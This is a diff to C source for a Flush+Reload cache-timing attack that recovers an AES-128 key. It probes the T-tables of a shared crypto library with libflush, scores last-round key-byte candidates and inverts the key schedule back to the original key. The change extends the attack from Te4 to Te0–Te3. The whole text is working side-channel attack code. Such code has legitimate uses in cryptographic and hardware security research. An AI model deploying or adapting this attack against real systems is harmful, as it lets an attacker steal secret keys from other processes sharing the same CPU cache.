@@ -73,6 +73,10 @@ static int map_crypto_library(struct last_round_attack_ctx *ctx)
 		return -1;
 	}
 	
+	cache_ctx->state_te0 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te0);
+	cache_ctx->state_te1 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te1);
+	cache_ctx->state_te2 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te2);
+	cache_ctx->state_te3 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te3);
 	cache_ctx->state_te4 = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_te4);
 	cache_ctx->state_rcon = (unsigned int*)(cache_ctx->crypto_lib_addr + args->off_rcon);
 	
@@ -165,29 +169,73 @@ static int cache_ctx_init(struct last_round_attack_ctx *ctx)
  * Attack Function -- Start
  */
 
-static inline unsigned int get_te_value(struct last_round_attack_ctx *ctx, int idx)
+static inline void * get_check_addr(struct last_round_attack_cache_ctx *cache_ctx, int te, int s)
 {
-	return *(ctx->cache_ctx.state_te4 + idx);
+	unsigned int *addr;
+
+	if(te == 0) 		addr = cache_ctx->state_te0;
+	else if(te == 1)	addr = cache_ctx->state_te1;
+	else if(te == 2)	addr = cache_ctx->state_te2;
+	else if(te == 3)	addr = cache_ctx->state_te3;
+	else if(te == 4)	addr = cache_ctx->state_te4;
+
+	addr  = (addr + s);
+	return (void *)addr;
 }
 
-static inline unsigned int get_rcon_value(struct last_round_attack_ctx *ctx, int idx)
+static inline unsigned int get_te_value(struct last_round_attack_cache_ctx *cache_ctx, int te, int idx)
 {
-	return *(ctx->cache_ctx.state_rcon + idx);
+	unsigned int *addr = (unsigned int *)get_check_addr(cache_ctx, te, idx);
+	return *addr;
+}
+
+static inline unsigned int get_rcon_value(struct last_round_attack_cache_ctx *cache_ctx, int idx)
+{
+	return *(cache_ctx->state_rcon + idx);
 }
  
-static inline int reload_and_is_access(libflush_session_t *session, void *addr, int threshold)
+static inline int reload_and_is_access(struct last_round_attack_cache_ctx *cache_ctx, int te, int s, int threshold)
 {
+	void *addr;
 	uint64_t count;
 
-	count = libflush_reload_address(session, addr);
+	addr = get_check_addr(cache_ctx, te, s);
+	count = libflush_reload_address(cache_ctx->libflush_session, addr);
 	if(count < threshold)
 		return 1;
 	return 0;
 }
 
-static inline void flush_te(libflush_session_t *session, void *addr)
+static inline void flush_te(struct last_round_attack_cache_ctx *cache_ctx, int te, int s)
 {
-	libflush_flush(session, addr);
+	void *addr;
+
+	addr = get_check_addr(cache_ctx, te, s);
+	libflush_flush(cache_ctx->libflush_session, addr);
+}
+
+/*
+ * Useful record combinations
+ *
+ * te2 ==> i = 0, 4, 8, 12
+ * te3 ==> i = 1, 5, 9, 13
+ * te0 ==> i = 2, 6, 10, 14
+ * te1 ==> i = 3, 7, 11, 15
+ */
+static inline int is_useful_record(int use_te4, int te, int i)
+{
+	int s;
+
+	if(use_te4 == 1)
+		return 1;
+	
+	s = te - 2;
+	if(s < 0)
+		s += 4;
+
+	if(i == s || i == s+4 || i == s+8 || i == s+12)
+		return 1;
+	return 0;
 }
 
 /* calcuate score */
@@ -199,39 +247,55 @@ static void calc_score(struct last_round_attack_ctx *ctx)
 	struct last_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
 
 	int i, j, s, p, max, best;
+	int start_te, end_te, te, use_te4;
+	void *addr;
 	unsigned int val_word;
 	U8 val;
 	U8 enc[AES128_KEY_LEN];
-	int access_table_s[T_TABLE_ENTRIES];	/* access table for T[s[i]] */
+	int access_table_s[5][T_TABLE_ENTRIES];		/* access table for Te0, Te1, Te2, Te3, Te4 */
+
+	use_te4 = ctx->args.is_use_te4;
+	if(use_te4 == 1) {
+		start_te = 4;
+		end_te = 4;
+	}else {
+		start_te = 0;
+		end_te = 3;
+	}
 
 	for(p=0; p<plain_text_cnt; p++) {
 		/* 0. Clear arrays */
 		memset(access_table_s, 0, sizeof(access_table_s));
 
-		for(s=0; s<T_TABLE_ENTRIES; s++) {
-			/* 1. Flush */
-			flush_te(cache_ctx->libflush_session, (void*)(cache_ctx->state_te4 + s));
+		for(te=start_te; te<=end_te; te++) {
+			for(s=0; s<T_TABLE_ENTRIES; s++) {
+				/* 1. Flush */
+				flush_te(cache_ctx, te, s);
 
-			/* 2. Do encryption */
-			ctx->encrypt(cache_ctx->plains[p], enc, sizeof(enc));
+				/* 2. Do encryption */
+				ctx->encrypt(cache_ctx->plains[p], enc, sizeof(enc));
 
-			/* 3. Record T table access */
-			access_table_s[s] = reload_and_is_access(cache_ctx->libflush_session, (void*)(cache_ctx->state_te4 + s), threshold);
+				/* 3. Record T table access */
+				access_table_s[te][s] = reload_and_is_access(cache_ctx, te, s, threshold);
+			}
 		}
 
 		/* 4. Increase counter */
 		for(i=0; i<AES128_KEY_LEN; i++) {	/* for all `Ki */
-			for(s=0; s<T_TABLE_ENTRIES; s++) {
-				if(access_table_s[s] == 1) {
-					val_word = *(cache_ctx->state_te4 + s);
-					val = ((U8*)&val_word)[i%4];
-					cache_ctx->score[i][enc[i] ^ val] += 1;	/* increase candidate score!! */
+			for(te=start_te; te<=end_te; te++) {
+				for(s=0; s<T_TABLE_ENTRIES; s++) {
+					if(access_table_s[te][s] == 1 && is_useful_record(use_te4, te, i) == 1) {
+						addr = get_check_addr(cache_ctx, te, s);
+						val_word = *((unsigned int*)addr);
+						val = ((U8*)&val_word)[3 - i%4];
+						cache_ctx->score[i][enc[i] ^ val] += 1;	/* increase candidate score!! */
+					}
 				}
 			}
 		}
 
 		/* 5. Print progress */
-		if(p % 50 == 0)
+		if(p % 20 == 0)
 			printf("progress : %d / %d\n", p, plain_text_cnt);
 	}
 }
@@ -274,6 +338,7 @@ static void invert_round_key(struct last_round_attack_ctx *ctx)
 	unsigned int dst, src;
 	U8 prev_round_key[AES128_KEY_LEN];
 	U8 curr_round_key[AES128_KEY_LEN];
+	struct last_round_attack_cache_ctx *cache_ctx = &ctx->cache_ctx;
 
 	memcpy(curr_round_key, ctx->result.predict_key, sizeof(curr_round_key));	/* start - last round key */
 	printf("invert round key!!\n");
@@ -285,17 +350,32 @@ static void invert_round_key(struct last_round_attack_ctx *ctx)
 			prev_round_key[i] = curr_round_key[i] ^ curr_round_key[i-4];
 
 		/* invert K(r)[0] - word-0 */
-		/* K(r)[0] = K(r+1)[0] ^ (Te4[K(r)[13]] & 0xff000000) 
+		src = GETU32(curr_round_key);
+		if(ctx->args.is_use_te4 == 1) {
+			/* 
+				K(r)[0] = K(r+1)[0] ^ (Te4[K(r)[13]] & 0xff000000) 
 							   ^ (Te4[K(r)[14]] & 0x00ff0000)
 							   ^ (Te4[K(r)[15]] & 0x0000ff00)
 							   ^ (Te4[K(r)[12]] & 0x000000ff)
 							   ^ rcon[r]
-		 */
-		src = GETU32(curr_round_key);
-		dst = src ^ (get_te_value(ctx, prev_round_key[13]) & 0xff000000) \
-								^ (get_te_value(ctx, prev_round_key[14]) & 0x00ff0000) \
-								^ (get_te_value(ctx, prev_round_key[15]) & 0x0000ff00) \
-								^ (get_te_value(ctx, prev_round_key[12]) & 0x000000ff) ^ get_rcon_value(ctx, r);
+			*/
+			dst = src ^ (get_te_value(cache_ctx, 4, prev_round_key[13]) & 0xff000000) \
+									^ (get_te_value(cache_ctx, 4, prev_round_key[14]) & 0x00ff0000) \
+									^ (get_te_value(cache_ctx, 4, prev_round_key[15]) & 0x0000ff00) \
+									^ (get_te_value(cache_ctx, 4, prev_round_key[12]) & 0x000000ff) ^ get_rcon_value(cache_ctx, r);
+		}else {
+			/* 
+				K(r)[0] = K(r+1)[0] ^ (Te2[K(r)[13]] & 0xff000000)
+							   ^ (Te3[K(r)[14]] & 0x00ff0000)
+							   ^ (Te0[K(r)[15]] & 0x0000ff00)
+							   ^ (Te1[K(r)[12]] & 0x000000ff)
+							   ^ rcon[r]
+			*/
+			dst = src ^ (get_te_value(cache_ctx, 2, prev_round_key[13]) & 0xff000000) \
+									^ (get_te_value(cache_ctx, 3, prev_round_key[14]) & 0x00ff0000) \
+									^ (get_te_value(cache_ctx, 0, prev_round_key[15]) & 0x0000ff00) \
+									^ (get_te_value(cache_ctx, 1, prev_round_key[12]) & 0x000000ff) ^ get_rcon_value(cache_ctx, r);
+		}
 		PUTU32(prev_round_key, dst);
 
 		/* iteration */
